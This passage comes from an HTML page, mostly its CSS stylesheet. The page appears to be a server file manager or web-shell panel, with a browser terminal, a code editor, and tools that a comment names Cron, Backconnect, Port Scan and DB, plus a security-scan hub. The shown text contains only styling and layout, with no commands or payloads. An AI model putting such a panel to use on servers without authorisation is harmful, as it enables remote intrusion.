    radial-gradient(circle at 30% 25%, rgba(245,185,66,.14) 0%, transparent 60%),
    linear-gradient(160deg, var(--ink3), var(--ink1));
  border: 1px solid var(--jade-bd);
  display: grid; place-items: center;
  box-shadow:
    var(--s2),
    inset 0 1px 0 rgba(255,255,255,.05),
    0 0 0 4px rgba(245,185,66,.04),
    0 0 32px rgba(245,185,66,.08);
  position: relative;
}
.empty-ico::after {
  content: ""; position: absolute; inset: -8px;
  border: 1px dashed var(--jade-bd);
  border-radius: 22px;
  opacity: .4;
  animation: emptyOrbit 18s linear infinite;
}
@keyframes emptyOrbit { to { transform: rotate(360deg) } }
.empty-ico svg { width: 36px; height: 36px; fill: var(--jade); opacity: .9 }
.empty-ico svg { width: 32px; height: 32px; fill: var(--jade); opacity: .65 }
.empty h3 { font-size: 17px; color: var(--tx); margin-bottom: 6px; font-weight: 600; letter-spacing: -.01em }
.empty p { font-size: 13px; color: var(--tx3); max-width: 280px; margin: 0 auto 20px }

/* ─── MODALS ──────────────────────────────────────────────────── */
.overlay {
  position: fixed; inset: 0; z-index: 200;
  background: rgba(3,3,4,.78);
  display: flex; align-items: center; justify-content: center;
  padding: 24px;
  opacity: 0; visibility: hidden;
  transition: opacity .2s var(--ease), visibility .2s var(--ease);
}
.overlay.open { opacity: 1; visibility: visible }

.modal {
  background: linear-gradient(180deg, var(--ink2) 0%, var(--ink1) 100%);
  border: 1px solid var(--bd2);
  border-radius: var(--r20);
  box-shadow: var(--s3), 0 0 0 1px rgba(255,255,255,.02) inset;
  width: 100%; max-height: 92vh;
  display: flex; flex-direction: column; overflow: hidden;
  transform: scale(.96) translateY(8px);
  transition: transform .24s var(--spring);
}
.overlay.open .modal { transform: scale(1) translateY(0) }
.m-sm { max-width: 460px } .m-md { max-width: 600px }
.m-lg { max-width: 920px } .m-full { width: 96vw; max-width: 1320px; height: 90vh }

.modal-head {
  display: flex; align-items: center; gap: 12px;
  padding: 14px 18px;
  border-bottom: 1px solid var(--bd2);
  flex-shrink: 0;
  background: linear-gradient(180deg, var(--ink1), var(--ink2));
  position: relative;
}
.modal-head::before {
  content: ""; position: absolute; left: 0; right: 0; bottom: -1px; height: 1px;
  background: linear-gradient(90deg, transparent, var(--jade-bd), transparent);
}
.modal-head h2 {
  font-size: 14px; font-weight: 600;
  flex: 1; letter-spacing: -.01em; color: var(--tx);
}
.path-tag {
  font-size: 10.5px; color: var(--jade);
  font-family: var(--mono); font-weight: 500;
  padding: 4px 10px;
  background: var(--ink3); border-radius: var(--r6);
  border: 1px solid var(--jade-bd);
  max-width: 280px;
  overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
}
.modal-body { padding: 20px; overflow: auto; flex: 1 }
.modal-foot {
  display: flex; align-items: center; justify-content: flex-end; gap: 10px;
  padding: 13px 18px;
  border-top: 1px solid var(--bd2);
  background: linear-gradient(180deg, transparent, rgba(0,0,0,.15));
  flex-shrink: 0;
}
.modal-foot .left { flex: 1; font-size: 11px; color: var(--tx3); font-family: var(--mono) }

/* ─── FORMS ───────────────────────────────────────────────────── */
.fg { margin-bottom: 16px }
.fg label {
  display: block; font-size: 10.5px; font-weight: 700;
  color: var(--tx3); text-transform: uppercase; letter-spacing: .1em;
  margin-bottom: 7px;
}
.fg input, .fg textarea, .fg select {
  width: 100%; padding: 10px 12px;
  background: var(--ink3);
  border: 1px solid var(--bd2);
  border-radius: var(--r8); outline: none;
  color: var(--tx); font-size: 13.5px;
  transition: border-color .15s var(--ease), box-shadow .15s var(--ease), background-color .15s var(--ease);
}
.fg input:hover:not(:focus), .fg textarea:hover:not(:focus), .fg select:hover:not(:focus) { background: var(--ink4); border-color: var(--bd) }
.fg input:focus, .fg textarea:focus, .fg select:focus {
  border-color: var(--jade-bd2);
  box-shadow: var(--s-jade-soft);
  background: var(--ink3);
}
.fg textarea {
  font-family: var(--mono); font-size: 13px;
  resize: vertical; min-height: 90px; line-height: 1.7;
}

/* ─── CODE EDITOR ─────────────────────────────────────────────── */
.editor-wrap {
  display: flex; flex: 1; overflow: hidden;
  border: 1px solid var(--bd2);
  border-radius: var(--r12);
  background: var(--ink0);
  min-height: 480px;
  box-shadow: inset 0 1px 2px rgba(0,0,0,.4);
}
.line-nums {
  padding: 18px 0;
  background: linear-gradient(180deg, var(--ink1), var(--ink0));
  border-right: 1px solid var(--bd2);
  font-family: var(--mono); font-size: 13px; line-height: 1.75;
  color: var(--tx4); text-align: right;
  user-select: none; overflow: hidden;
  min-width: 56px; flex-shrink: 0;
  font-variant-numeric: tabular-nums;
}
.line-nums div { padding: 0 12px }
.ed-area { flex: 1; position: relative; overflow: hidden }
.ed-area .ed-highlight,
.ed-area textarea {
  position: absolute; inset: 0; width: 100%; height: 100%;
  margin: 0;
  padding: 18px 20px;
  font-family: var(--mono); font-size: 13px; line-height: 1.75;
  tab-size: 4;
  white-space: pre;
  word-wrap: normal;
  overflow: auto;
  border: none;
  border-radius: 0;
}
.ed-area .ed-highlight {
  pointer-events: none;
  z-index: 1;
  color: var(--tx);
  overflow: hidden;
}
.ed-area textarea {
  z-index: 2;
  background: transparent;
  outline: none;
  resize: none;
  color: transparent;
  caret-color: var(--jade);
  -webkit-text-fill-color: transparent;
}
.ed-area textarea::selection { background: rgba(245,185,66,.30); color: transparent }
.ed-area textarea::-moz-selection { background: rgba(245,185,66,.30); color: transparent }
.ed-area.no-highlight textarea {
  color: var(--tx);
  -webkit-text-fill-color: var(--tx);
}
.ed-area.no-highlight .ed-highlight { display: none }

/* ─── SYNTAX TOKEN COLORS — Noir Gold palette ────────────────── */
.tk-com { color: #6e6a5e; font-style: italic }
.tk-str { color: #c4d196 }
.tk-num { color: #f5b942 }
.tk-key { color: #ff8c70 }
.tk-fn  { color: #e0bcff }
.tk-var { color: #ffa657 }
.tk-tag { color: #b8d986 }
.tk-att { color: #d4961f }
.tk-cls { color: #ffa657 }
.tk-pun { color: var(--tx2) }
.tk-bool{ color: #f5b942; font-weight: 600 }
.tk-op  { color: #ff8c70 }
.tk-md-h{ color: #f5b942; font-weight: 700 }
.tk-md-em{ color: #e0bcff; font-style: italic }
.tk-md-cd{ color: #c4d196 }
.tk-md-li{ color: #ff8c70 }

/* ─── IMAGE PREVIEW MODAL ─────────────────────────────────────── */
.ip-tabs {
  display: flex; gap: 2px;
  background: var(--ink3);
  border: 1px solid var(--bd2);
  border-radius: var(--r8);
  padding: 3px;
}
.ip-tab {
  padding: 5px 14px; font-size: 12px; font-weight: 500;
  color: var(--tx3); background: transparent;
  border: none; border-radius: var(--r6);
  cursor: pointer;
  transition: color .15s var(--ease), background-color .15s var(--ease);
}
.ip-tab:hover:not(.active) { background: var(--ink4); color: var(--tx2) }
.ip-tab.active {
  background: linear-gradient(180deg, var(--ink4), var(--ink3));
  color: var(--jade);
  box-shadow: 0 1px 0 rgba(255,255,255,.04) inset;
}

.ip-pane {
  display: flex; flex-direction: column;
  align-items: center; justify-content: center;
  min-height: 360px;
  background:
    repeating-conic-gradient(var(--ink2) 0% 25%, var(--ink1) 0% 50%) 50% / 24px 24px;
  border: 1px solid var(--bd2);
  border-radius: var(--r12);
  padding: 16px;
  position: relative;
}
.ip-image img {
  max-width: 100%;
  max-height: 70vh;
  object-fit: contain;
  border-radius: var(--r8);
  box-shadow: var(--s2);
  background: #000;
}
.ip-image .img-info {
  position: absolute; left: 14px; bottom: 14px;
  font-family: var(--mono); font-size: 11px;
  background: rgba(0,0,0,.65);
  border: 1px solid var(--bd2);
  border-radius: var(--r6);
  padding: 4px 10px;
  color: var(--tx2);
}
.ip-text {
  background: var(--ink0);
  align-items: stretch; justify-content: stretch;
  padding: 0;
  min-height: 360px;
}
.ip-text pre {
  flex: 1;
  margin: 0; padding: 16px 18px;
  font-family: var(--mono); font-size: 12.5px; line-height: 1.7;
  color: var(--tx2);
  white-space: pre-wrap; word-break: break-all;
  overflow: auto;
  max-height: 70vh;
}
.ip-text pre.hex-mode {
  white-space: pre; word-break: normal;
}

/* ─── TOOLS (Cron, Backconnect, Port Scan, DB) ──────────────── */
.tool-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px }
.tool-grid .fg { margin-bottom: 0 }
.tool-grid .span2 { grid-column: 1 / -1 }
@media (max-width: 640px) { .tool-grid { grid-template-columns: 1fr } }
.tool-output {
  margin-top: 14px; padding: 12px 14px;
  background: var(--ink0); border: 1px solid var(--bd2);
  border-radius: var(--r10); font-family: var(--mono);
  font-size: 12px; line-height: 1.65; color: var(--tx2);
  max-height: 280px; overflow: auto; white-space: pre-wrap;
}
.tool-output.empty { color: var(--tx4); font-style: italic }
.tool-output.tall { max-height: 420px; min-height: 180px }
.tool-cmd {
  font-family: var(--mono); font-size: 11px; color: var(--jade);
  padding: 8px 10px; margin-bottom: 10px;
  background: var(--ink0); border: 1px solid var(--jade-bd);
  border-radius: var(--r8); word-break: break-all; line-height: 1.5;
}
.tool-tags { display: flex; flex-wrap: wrap; gap: 6px; margin-top: 10px }
.tool-tag {
  font-family: var(--mono); font-size: 11px; font-weight: 600;
  padding: 4px 10px; border-radius: 999px;
  background: var(--jade-bg); border: 1px solid var(--jade-bd);
  color: var(--jade-hi);
}
.tool-tag.closed {
  background: var(--red-bg); border-color: var(--red-bd); color: var(--red);
}
.db-result-wrap { overflow: auto; max-height: 340px; margin-top: 12px; border: 1px solid var(--bd2); border-radius: var(--r10) }
.db-result-wrap table { width: 100%; border-collapse: collapse; font-size: 12px }
.db-result-wrap th, .db-result-wrap td {
  padding: 7px 10px; text-align: left; border-bottom: 1px solid var(--bd2);
  font-family: var(--mono); white-space: nowrap; max-width: 220px;
  overflow: hidden; text-overflow: ellipsis;
}
.db-result-wrap th { background: var(--ink3); color: var(--jade); font-weight: 600; position: sticky; top: 0 }
.db-result-wrap tr:hover td { background: rgba(245,185,66,.04) }
.db-tables { display: flex; flex-wrap: wrap; gap: 6px; margin-top: 8px }
.db-table-chip {
  font-family: var(--mono); font-size: 11px; padding: 4px 9px;
  border-radius: var(--r6); background: var(--ink3); border: 1px solid var(--bd2);
  color: var(--tx2); cursor: pointer; transition: all .15s var(--ease);
}
.db-table-chip:hover { border-color: var(--jade-bd); color: var(--jade) }
.tool-note { font-size: 11px; color: var(--tx4); margin-top: 8px; line-height: 1.5 }

/* ─── CYBER SECURITY HUB ─────────────────────────────────────── */
.sec-tabs {
  padding: 10px 14px 0;
  border-bottom: 1px solid var(--bd2);
  background: var(--ink1);
  flex-wrap: wrap;
  gap: 4px;
}
.sec-panel { display: none }
.sec-panel.active { display: block }
.sec-panel .tool-output { max-height: 360px; min-height: 200px }
.sec-actions { display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 12px; align-items: center }
.sec-actions .btn-sm { font-size: 11px; padding: 6px 12px }
.blue-badge {
  display: inline-block; font-size: 10px; font-weight: 700; padding: 2px 8px;
  border-radius: 999px; margin-right: 6px; font-family: var(--mono);
}
.blue-badge.critical { background: var(--red-bg); color: var(--red); border: 1px solid var(--red-bd) }
.blue-badge.high { background: var(--amber-bg); color: var(--amber); border: 1px solid rgba(212,150,31,.3) }
.blue-badge.ok { background: var(--jade-bg); color: var(--jade); border: 1px solid var(--jade-bd) }
.blue-threat-wrap {
  margin-top: 12px; border: 1px solid var(--bd2); border-radius: var(--r10);
  background: var(--ink0); max-height: 320px; overflow: auto;
}
.blue-threat-item {
  display: flex; gap: 10px; align-items: flex-start; padding: 10px 12px;
  border-bottom: 1px solid var(--bd2); font-size: 12px;
}
.blue-threat-item:last-child { border-bottom: none }
.blue-threat-item:hover { background: rgba(245,185,66,.03) }
.blue-threat-item input { margin-top: 3px; flex-shrink: 0; accent-color: var(--jade) }
.blue-threat-info { flex: 1; min-width: 0 }
.blue-threat-path {
  font-family: var(--mono); font-size: 11.5px; color: var(--tx);
  word-break: break-all; line-height: 1.45;
}
.blue-threat-meta { font-size: 10.5px; color: var(--tx4); margin-top: 4px; line-height: 1.5 }
.blue-threat-sev {
  font-family: var(--mono); font-size: 10px; font-weight: 700;
  padding: 2px 7px; border-radius: 4px; flex-shrink: 0;
}
.blue-threat-sev.CRITICAL { background: var(--red-bg); color: var(--red) }
.blue-threat-sev.HIGH { background: var(--amber-bg); color: var(--amber) }
.blue-threat-sev.MEDIUM { background: rgba(121,192,255,.12); color: var(--blue) }
.blue-threat-sev.LOW { background: var(--ink4); color: var(--tx3) }
.blue-threat-actions {
  display: none; flex-wrap: wrap; gap: 8px; margin-top: 12px; align-items: center;
}
.blue-threat-actions.show { display: flex }
.blue-threat-actions .btn-danger { background: var(--red-bg); border-color: var(--red-bd); color: var(--red) }
.blue-threat-actions .btn-danger:hover { background: rgba(248,113,113,.2) }

/* ─── TERMINAL — Premium Warp/iTerm-inspired ─────────────────── */
.term-modal .modal-body {
  padding: 0; display: flex; flex-direction: column;
  background: var(--ink0);
  position: relative;
  overflow: hidden;
}
.term-modal .modal-body::before {
  content: "";
  position: absolute; inset: 0;
  background: repeating-linear-gradient(
    0deg,
    transparent 0,
    transparent 2px,
    rgba(245,185,66,.012) 3px,
    transparent 4px
  );
  pointer-events: none; opacity: .45;
  z-index: 0;
}

.term-top {
  display: flex; align-items: center; gap: 14px;
  padding: 11px 18px;
  background: linear-gradient(180deg, var(--ink2), var(--ink1));
  border-bottom: 1px solid var(--bd2);
  box-shadow: inset 0 -1px 0 rgba(245,185,66,.05);
  flex-shrink: 0;
  position: relative; z-index: 2;
}
.term-dots { display: flex; gap: 7px }
.term-dots i {
  width: 12px; height: 12px; border-radius: 50%;
  display: block;
  box-shadow:
    inset 0 1px 0 rgba(255,255,255,.28),
    0 1px 2px rgba(0,0,0,.4);
  transition: opacity .2s var(--ease), transform .2s var(--ease);
}
.term-dots i:nth-child(1) { background: linear-gradient(135deg, #ff7a6e, #ff5f57) }
.term-dots i:nth-child(2) { background: linear-gradient(135deg, #ffd13b, #febc2e) }
.term-dots i:nth-child(3) { background: linear-gradient(135deg, #4cd964, #28c840) }
.term-dots:hover i { opacity: .85 }

.term-title-area {
  flex: 1; display: flex; flex-direction: column; gap: 2px;
  align-items: center; min-width: 0;
}
.term-title {
  font-size: 11px; font-weight: 700;
  color: var(--tx2); letter-spacing: .14em;
  text-transform: uppercase;
  display: flex; align-items: center; gap: 7px;
}
.term-title-icon {
  width: 12px; height: 12px;
  stroke: var(--jade); fill: none;
  filter: drop-shadow(0 0 4px rgba(245,185,66,.4));
}
.term-cwd {
  font-family: var(--mono); font-size: 10.5px;
  color: var(--tx4); font-weight: 500;
  max-width: 60ch;
  overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
  letter-spacing: .02em;
}

.term-actions { display: flex; gap: 5px; align-items: center }
.term-stats {
  font-family: var(--mono); font-size: 10px;
  color: var(--tx4); font-weight: 500;
  padding: 3px 9px; border-radius: 4px;
  background: var(--ink3); border: 1px solid var(--bd2);
  display: flex; align-items: center; gap: 4px;
}
.term-stats b { color: var(--jade); font-weight: 700; font-variant-numeric: tabular-nums }
.term-actions .term-btn {
  width: 28px; height: 28px;
  border-radius: 6px;
  background: transparent; border: 1px solid transparent;
  color: var(--tx3); cursor: pointer;
  display: grid; place-items: center;
  transition: all .15s var(--ease);
}
.term-actions .term-btn:hover {
  background: var(--ink3);
  color: var(--jade);
  border-color: var(--bd2);
}
.term-actions .term-btn svg { width: 13px; height: 13px; fill: currentColor }

/* Output area */
.term-out {
  flex: 1; overflow-y: auto;
  padding: 18px 22px 14px;
  font-family: var(--mono); font-size: 12.5px; line-height: 1.7;
  color: var(--tx2);
  position: relative; z-index: 1;
  scroll-behavior: smooth;
  background:
    radial-gradient(ellipse 700px 350px at 50% 0%, rgba(245,185,66,.022) 0%, transparent 70%);
}

/* Welcome banner */
.term-banner {
  margin: 0 0 18px 0;
  padding: 14px 16px;
  background: linear-gradient(135deg, rgba(245,185,66,.06), rgba(245,185,66,.02));
  border: 1px solid var(--jade-bd);
  border-left: 3px solid var(--jade);
  border-radius: 8px;
  font-family: var(--mono); font-size: 11.5px;
  color: var(--tx2); line-height: 1.65;
}
.term-banner b {
  color: var(--jade); font-weight: 700;
  letter-spacing: .04em;
  display: block; margin-bottom: 4px;
  font-size: 12px;
}
.term-banner .kbd {
  font-family: var(--mono); font-size: 10.5px;
  padding: 1px 6px; border-radius: 3px;
  background: var(--ink3); border: 1px solid var(--bd2);
  color: var(--tx); font-weight: 600;
  margin: 0 2px;
}

/* Block-style output (each command gets its own card) */
.term-block {
  margin-bottom: 16px;
  padding-left: 14px;
  border-left: 2px solid var(--bd2);
  position: relative;
  animation: tblockIn .22s var(--ease-out);
}
@keyframes tblockIn {
  from { opacity: 0; transform: translateX(-4px) }
  to   { opacity: 1; transform: translateX(0) }
}
.term-block.success { border-left-color: var(--jade-bd2) }
.term-block.error   { border-left-color: rgba(248,113,113,.55) }
.term-block.running { border-left-color: var(--jade) }
.term-block.running::before {
  content: ""; position: absolute;
  left: -2px; top: 0; bottom: 0; width: 2px;
  background: var(--jade);
  animation: tblockPulse 1.2s var(--ease) infinite;
}
@keyframes tblockPulse {
  0%, 100% { opacity: 1 }
  50%      { opacity: .35 }
}

.term-cmd-line {
  display: flex; align-items: center; gap: 10px;
  padding: 4px 0 8px;
  font-weight: 500;
}
.term-prompt-mini {
  color: var(--jade); font-weight: 800;
  font-size: 13px; flex-shrink: 0;
  text-shadow: 0 0 8px rgba(245,185,66,.5);
}
.term-cmd-text {
  flex: 1; color: var(--tx);
  white-space: pre-wrap; word-break: break-all;
  font-weight: 500;
}
.term-cmd-meta {
  display: flex; gap: 6px; align-items: center;
  font-size: 10px; color: var(--tx4);
  font-weight: 500; flex-shrink: 0;
  font-variant-numeric: tabular-nums;
}
.term-time { opacity: .65 }
.term-duration {
  padding: 1px 7px; border-radius: 3px;
  background: var(--ink3); border: 1px solid var(--bd2);
  color: var(--tx3); letter-spacing: .02em;
}
.term-block.success .term-duration { color: var(--jade); border-color: var(--jade-bd) }
.term-block.error .term-duration { color: var(--red); border-color: rgba(248,113,113,.3) }

.term-out-text {
  white-space: pre-wrap; word-break: break-word;
  padding: 2px 0;
  color: var(--tx2);
  font-size: 12.5px;
  line-height: 1.7;
}
.term-block.error .term-out-text { color: #ffb3b3 }
.term-block.dim  .term-out-text { color: var(--tx4); font-style: italic }
.term-exit-note {
  display: inline-flex; align-items: center; gap: 6px;
  margin-top: 6px; padding: 2px 9px;
  font-size: 10.5px; font-weight: 600;
  background: rgba(248,113,113,.1);
  border: 1px solid rgba(248,113,113,.25);
  border-radius: 4px;
  color: var(--red);
}

/* Animated running dots */
.term-running-dots {
  display: inline-flex; gap: 5px;
  padding: 6px 0; align-items: center;
}
.term-running-dots span {
  width: 5px; height: 5px; border-radius: 50%;
  background: var(--jade);
  animation: trd 1.2s var(--ease) infinite;
}
.term-running-dots span:nth-child(2) { animation-delay: .15s }
.term-running-dots span:nth-child(3) { animation-delay: .3s }
@keyframes trd {
  0%, 100% { opacity: .3; transform: scale(.8) }
  50%      { opacity: 1; transform: scale(1) }
}

/* Legacy line for system/dim messages */
.term-line { margin-bottom: 2px; animation: tline .12s var(--ease) }
@keyframes tline { from{opacity:0; transform: translateY(-2px)} to{opacity:1; transform: translateY(0)} }
.term-line.cmd { color: var(--jade); font-weight: 500 }
.term-line.err { color: var(--red) }
.term-line.dim { color: var(--tx4); font-style: italic }

/* Input row — premium prompt segments */
.term-in-row {
  display: flex; align-items: center; gap: 12px;
  padding: 13px 22px;
  border-top: 1px solid var(--bd2);
  background: linear-gradient(180deg, var(--ink1), var(--ink0));
  flex-shrink: 0;
  position: relative; z-index: 2;
  transition: box-shadow .25s var(--ease);
}
.term-in-row::before {
  content: ""; position: absolute;
  left: 0; right: 0; top: 0; height: 1px;
  background: linear-gradient(90deg, transparent, var(--jade-bd), transparent);
  transition: background .25s var(--ease);
}
.term-in-row:focus-within {
  box-shadow: 0 -8px 24px rgba(245,185,66,.06);
}
.term-in-row:focus-within::before {
  background: linear-gradient(90deg, transparent, var(--jade), transparent);
}

.term-prompt-area {
  display: flex; align-items: baseline; gap: 0;
  font-family: var(--mono); font-size: 12px;
  flex-shrink: 0;
  letter-spacing: .01em;
}
.term-prompt-user { color: var(--jade); font-weight: 700 }
.term-prompt-at   { color: var(--tx4); margin: 0 1px }
.term-prompt-host { color: var(--jade-hi); font-weight: 600 }
.term-prompt-colon{ color: var(--tx4); margin: 0 1px }
.term-prompt-cwd {
  color: #79c0ff; font-weight: 500;
  max-width: 28ch;
  overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
}
.term-prompt-mark {
  color: var(--jade); font-weight: 800;
  font-size: 14px; line-height: 1;
  margin-left: 7px;
  text-shadow: 0 0 8px rgba(245,185,66,.55);
}

.term-in-row input {
  flex: 1; background: transparent; border: none; outline: none;
  font-family: var(--mono); font-size: 13px; color: var(--tx);
  caret-color: var(--jade);
  letter-spacing: .015em;
  min-width: 0;
}
.term-in-row input::placeholder {
  color: var(--tx4); font-style: italic; opacity: .7;
}

.term-spinner {
  display: none; flex-shrink: 0;
  width: 14px; height: 14px;
  border: 2px solid var(--jade-bd);
  border-top-color: var(--jade);
  border-radius: 50%;
  animation: tspin .7s linear infinite;
}
.term-spinner.show { display: inline-block }
@keyframes tspin { to { transform: rotate(360deg) } }

.term-hint {
  font-family: var(--mono); font-size: 9.5px;
  color: var(--tx4);
  display: flex; gap: 10px; align-items: center;
  flex-shrink: 0; opacity: .65;
  letter-spacing: .04em;
}
.term-hint .kbd {
  padding: 1px 6px; border-radius: 3px;
  background: var(--ink3); border: 1px solid var(--bd2);
  color: var(--tx3); font-weight: 700;
  margin-right: 3px;
}

@media (max-width: 720px) {
  .term-title-area { display: none }
  .term-hint { display: none }
  .term-stats { display: none }
  .term-prompt-host, .term-prompt-at { display: none }
  .term-in-row { padding: 12px 14px; gap: 8px }
  .term-out { padding: 14px 14px 10px }
}

/* ─── CONTEXT MENU ────────────────────────────────────────────── */
.ctx {
  position: fixed; z-index: 300;
  background: linear-gradient(180deg, var(--ink3), var(--ink2));
  border: 1px solid var(--bd2);
  border-radius: var(--r12);
  box-shadow: var(--s3), 0 0 0 1px rgba(255,255,255,.02) inset;
  min-width: 200px; padding: 5px; display: none;
  transform-origin: top left;
  animation: ctxPop .14s var(--spring);
}
@keyframes ctxPop {
  from { opacity: 0; transform: scale(.94) translateY(-2px) }
  to   { opacity: 1; transform: scale(1) translateY(0) }
}
.ctx.open { display: block }
.ci {
  display: flex; align-items: center; gap: 10px;
  padding: 8px 12px; font-size: 12.5px; font-weight: 500;
  border-radius: var(--r8); cursor: pointer; color: var(--tx2);
  border: none; background: transparent;
  width: 100%; text-align: left;
  transition: background-color .1s var(--ease), color .1s var(--ease);
}
.ci:hover { background: var(--jade-bg); color: var(--tx) }
.ci.danger:hover { background: var(--red-bg); color: var(--red) }
.ci svg { width: 13px; height: 13px; fill: currentColor; opacity: .75 }
.ci:hover svg { opacity: 1 }
.ctx-sep { height: 1px; background: var(--bd2); margin: 4px 6px }

/* ─── TOASTS ──────────────────────────────────────────────────── */
.toasts {
  position: fixed; bottom: 20px; right: 20px; z-index: 400;
  display: flex; flex-direction: column-reverse; gap: 8px;
  pointer-events: none;
}
.toast {
  padding: 11px 14px 11px 12px;
  background: linear-gradient(180deg, var(--ink3), var(--ink2));
  border: 1px solid var(--bd2);
  border-radius: var(--r10);
  box-shadow: var(--s2), 0 0 0 1px rgba(255,255,255,.02) inset;
  font-size: 12.5px; font-weight: 500;
  color: var(--tx);
  display: flex; align-items: center; gap: 11px;
  pointer-events: auto; max-width: 380px;
  animation: toastIn .26s var(--spring);
}
@keyframes toastIn {
  from { opacity: 0; transform: translateX(20px) scale(.96) }
  to   { opacity: 1; transform: translateX(0) scale(1) }
}
.t-dot { width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0 }
.toast.ok { border-color: var(--jade-bd) }
.toast.ok .t-dot { background: var(--jade); box-shadow: 0 0 0 3px var(--jade-bg), 0 0 8px var(--jade) }
.toast.err { border-color: var(--red-bd) }
.toast.err .t-dot { background: var(--red); box-shadow: 0 0 0 3px var(--red-bg), 0 0 8px var(--red) }

/* ─── SEARCH RESULTS ──────────────────────────────────────────── */
.sr-list {
  position: absolute; top: calc(100% + 8px); left: 0; right: 0;
  background: linear-gradient(180deg, var(--ink3), var(--ink2));
  border: 1px solid var(--bd2);
  border-radius: var(--r12);
  box-shadow: var(--s3);
  max-height: 360px; overflow-y: auto; z-index: 150;
  padding: 5px; display: none;
  animation: ctxPop .15s var(--spring);
}
.sr-list.open { display: block }
.sr-item {
  display: flex; align-items: center; gap: 11px;
  padding: 9px 11px; font-size: 12.5px;
  border-radius: var(--r8);
  cursor: pointer;
  transition: background-color .1s var(--ease);
}
.sr-item:hover { background: var(--jade-bg) }
.sr-path {
  font-size: 10.5px; color: var(--tx3);
  font-family: var(--mono);
  margin-left: auto; max-width: 50%;
  overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
}

/* ─── DROPZONE ────────────────────────────────────────────────── */
.dropzone {
  border: 2px dashed var(--bd2);
  border-radius: var(--r16);
  padding: 50px 24px; text-align: center; color: var(--tx3);
  cursor: pointer;
  background:
    radial-gradient(ellipse 300px 200px at 50% 0%, rgba(245,185,66,.04), transparent 70%),
    var(--ink3);
  transition: border-color .15s var(--ease), background-color .15s var(--ease), transform .15s var(--ease-out);
}
.dropzone:hover {
  border-color: var(--jade-bd2);
  background: var(--jade-bg);
}
.dropzone.over {
  border-color: var(--jade);
  background: var(--jade-bg);
  transform: scale(1.005);
  box-shadow: 0 0 0 4px rgba(245,185,66,.06), inset 0 0 40px rgba(245,185,66,.05);
}
.dropzone svg { width: 44px; height: 44px; fill: var(--jade); opacity: .55; margin-bottom: 14px }
.dropzone:hover svg, .dropzone.over svg { opacity: 1 }
.dropzone strong { color: var(--jade) }

/* ─── UTILITIES ───────────────────────────────────────────────── */
.spin { animation: spin .7s linear infinite }
@keyframes spin { to { transform: rotate(360deg) } }
.hidden { display: none !important }

/* ─── HAMBURGER (mobile only) ─────────────────────────────────── */
.btn-burger {
  display: none;
  width: 38px; height: 38px;
  align-items: center; justify-content: center;
  border: 1px solid var(--bd2);
  background: var(--ink2);
  border-radius: var(--r8);
  cursor: pointer; flex-shrink: 0;
  color: var(--tx2);
  transition: background-color .15s var(--ease), border-color .15s var(--ease), color .15s var(--ease);
}
.btn-burger:hover {
  background: var(--ink3); color: var(--jade);
  border-color: var(--jade-bd);
}
.btn-burger svg { width: 18px; height: 18px; fill: currentColor }

/* ─── SIDEBAR BACKDROP (mobile only) ─────────────────────────── */
.sb-backdrop {
  display: none;
  position: fixed; inset: 0;
  background: rgba(3,3,4,.6);
  z-index: 89;
  opacity: 0;
  transition: opacity .22s var(--ease);
}
.sb-backdrop.open { opacity: 1 }

/* ─── RESPONSIVE ──────────────────────────────────────────────── */
@media (max-width: 960px) {
  /* Sidebar → off-canvas drawer */
  .sidebar {
    position: fixed; top: 0; left: 0; bottom: 0;
    width: min(280px, 84vw);
    z-index: 90;
    transform: translateX(-100%);
    transition: transform .26s var(--ease-out);
    box-shadow: var(--s3);
    will-change: transform;
  }
  .sidebar.open { transform: translateX(0) }
  .sb-backdrop.show { display: block }

  /* Show hamburger */
  .btn-burger { display: inline-flex }

  /* Logo: hide text but keep icon */
  .logo {
    min-width: auto; padding-right: 0;
    border-right: none; margin-right: 0;
    gap: 0;
  }
  .logo-text { display: none }

  /* Compact table — hide non-essential columns */
  .tbl-head, .frow { grid-template-columns: 36px 1fr 100px 86px }
  .tbl-head > *:nth-child(n+5),
  .frow > *:nth-child(n+5) { display: none }
}

@media (max-width: 640px) {
  .topbar { padding: 0 12px; gap: 10px }
  .search-wrap { max-width: none }
  .kbd-hint { display: none }
  .topbar-right { gap: 6px }
  .btn-term span, .btn-term { padding-left: 10px; padding-right: 10px }
  .btn-term { font-size: 0; gap: 0; padding: 8px }
  .btn-term svg { width: 16px; height: 16px }

  /* Compact table — show only checkbox + name + size */
  .tbl-head, .frow { grid-template-columns: 36px 1fr 80px }
  .tbl-head > *:nth-child(n+4),
  .frow > *:nth-child(n+4) { display: none }

  /* Status bar simplified */
  .statusbar { gap: 12px; padding: 0 12px; font-size: 10.5px }
  #stClock, #stDisk { display: none }

  /* Action bar tighter */
  .actionbar { padding: 8px 12px; gap: 6px }
  .breadcrumb { padding: 4px 6px; min-height: 36px }
  .bc-btn { padding: 3px 7px; font-size: 11.5px }

  /* Modals: full width with slight padding */
  .overlay { padding: 12px }
  .modal-head { padding: 12px 14px }
  .modal-body { padding: 14px }
  .modal-foot { padding: 11px 14px }
}

@media (max-width: 420px) {
  .topbar { padding: 0 8px }
  .search-wrap input { padding: 9px 12px 9px 34px }
  .view-pills { display: none }
  .btn-burger { width: 36px; height: 36px }
}
</style>
</head>
<body>
<div class="bg-mesh" aria-hidden="true"></div>
<div class="shell">

<header class="topbar">
  <button class="btn-burger" id="btnBurger" aria-label="Toggle menu" aria-controls="sidebar" aria-expanded="false">
    <svg viewBox="0 0 24 24"><path d="M3 6.5A1.5 1.5 0 0 1 4.5 5h15a1.5 1.5 0 0 1 0 3h-15A1.5 1.5 0 0 1 3 6.5Zm0 5.5A1.5 1.5 0 0 1 4.5 10.5h15a1.5 1.5 0 0 1 0 3h-15A1.5 1.5 0 0 1 3 12Zm1.5 4A1.5 1.5 0 0 0 3 17.5 1.5 1.5 0 0 0 4.5 19h15a1.5 1.5 0 0 0 0-3h-15Z"/></svg>
  </button>

  <div class="logo">
    <div class="logo-icon" aria-hidden="true">
      <svg viewBox="0 0 24 24" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round">
        <path d="M5 8l4 4-4 4"/>
        <path d="M12 16h7"/>
      </svg>
    </div>
    <div class="logo-text">
